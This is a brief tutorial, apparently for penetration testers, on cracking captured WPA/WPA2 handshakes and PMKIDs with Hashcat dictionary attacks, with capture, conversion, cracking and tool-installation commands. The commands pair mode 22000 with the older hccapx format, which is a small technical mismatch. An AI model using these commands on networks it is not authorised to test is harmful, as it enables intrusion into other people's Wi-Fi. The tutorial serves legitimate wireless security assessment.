
# Cracking Wireless (WPA/WPA2) Handshakes with Hashcat

This guide covers techniques for cracking WPA/WPA2 handshakes, including both MIC (4-way handshake) and PMKID, using Hashcat. These methods are valuable during penetration tests, wireless assessments, and red team engagements.

## Cracking MIC

### Overview
A MIC (Message Integrity Check) ensures that packets sent between a client and a wireless access point (AP) have not been tampered with. To perform an offline cracking attack:
1. Capture a valid 4-way handshake using tools like `airodump-ng`.
2. Convert the capture file to Hashcat's required `hccapx` format using `cap2hccapx.bin`.

### Steps
1. **Capture the handshake:**
   Use `airodump-ng` to capture the WPA handshake.
2. **Convert the capture file:**
   ```bash
   ./cap2hccapx.bin input.cap output.hccapx
   ```
3. **Crack the hash:**
   Use a dictionary attack with Hashcat's mode 22000:
   ```bash
   hashcat -a 0 -m 22000 output.hccapx /path/to/wordlist.txt
   ```

## Cracking PMKID

### Overview
The PMKID attack allows obtaining the pre-shared key (PSK) without deauthenticating users. The PMKID is located in the first packet of the 4-way handshake.

### Steps
1. **Extract PMKID from the capture file:**
   Use `hcxpcaptool` or `hcxpcapngtool`:
   ```bash
   hcxpcaptool -z pmkidhash output.cap
   ```
2. **Crack the PMKID hash:**
   Run a dictionary attack using Hashcat's mode 22000:
   ```bash
   hashcat -a 0 -m 22000 pmkidhash /path/to/wordlist.txt
   ```

## Tools Installation

### Hashcat-Utils Installation
Clone and compile the `hashcat-utils` repository:
```bash
git clone https://github.com/hashcat/hashcat-utils.git
cd hashcat-utils/src
make
```

### hcxtools Installation
Install `hcxtools` or compile it from the GitHub repository:
```bash
sudo apt install hcxtools
```
Or compile it manually:
```bash
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools
make && make install
```

## Closing Thoughts
These techniques are valuable for assessing wireless network security. Use them to identify weaknesses and strengthen defenses in wireless environments.
https://hashcat.net/cap2hashcat/index.pl
